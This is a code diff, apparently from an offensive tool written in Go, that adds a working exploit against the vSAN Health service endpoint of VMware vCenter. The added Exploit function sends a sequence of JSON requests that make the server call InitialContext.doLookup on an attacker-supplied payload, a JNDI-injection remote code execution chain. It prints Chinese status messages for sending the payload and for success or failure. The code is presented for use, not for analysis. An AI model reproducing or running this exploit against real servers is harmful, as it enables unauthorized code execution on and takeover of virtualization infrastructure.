@@ -6,6 +6,7 @@ import (
 	"encoding/base64"
 	"fmt"
 	"io/ioutil"
+	"log"
 	"os"
 	"strings"
 	"time"
@@ -136,4 +137,44 @@ func Attack(url, command string) {
 	time.Sleep(1)
 	Execute(url)
 	// fmt.Println(To_b64(t1))
+}
+
+func send(url, uri, json_body string) {
+	client := req.C()
+	client.EnableInsecureSkipVerify()
+	client.EnableForceHTTP1()
+	base := "/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService"
+	resp, err := client.R().SetBodyJsonString(json_body).Post(url + base + uri)
+	if err != nil {
+		log.Fatal(err)
+		fmt.Println("[-] 连接失败，请检查网络.")
+		os.Exit(0)
+
+	}
+	if uri == "/invoke" {
+		if resp.StatusCode == 200 {
+			return
+		} else {
+			fmt.Println("[-] 利用失败.")
+			os.Exit(0)
+		}
+	}
+	if !strings.Contains(resp.String(), "result") {
+		fmt.Println("[-] 利用失败.")
+		os.Exit(0)
+	}
+}
+
+func Exploit(url, payload string) {
+
+	fmt.Println("[*] 正在发送payload...")
+	uris := []string{"/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"}
+	send(url, uris[0], "{\"methodInput\": [null]}")
+	send(url, uris[1], "{\"methodInput\": [\"javax.naming.InitialContext.doLookup\"]}")
+	send(url, uris[2], "{\"methodInput\": [\"doLookup\"]}")
+	send(url, uris[3], fmt.Sprintf("{\"methodInput\": [[\"%s\"]]}", payload))
+	send(url, uris[4], "{\"methodInput\": [null]}")
+	send(url, uris[5], "{\"methodInput\": []}")
+	fmt.Println("[+] 发送成功.")
+
 }
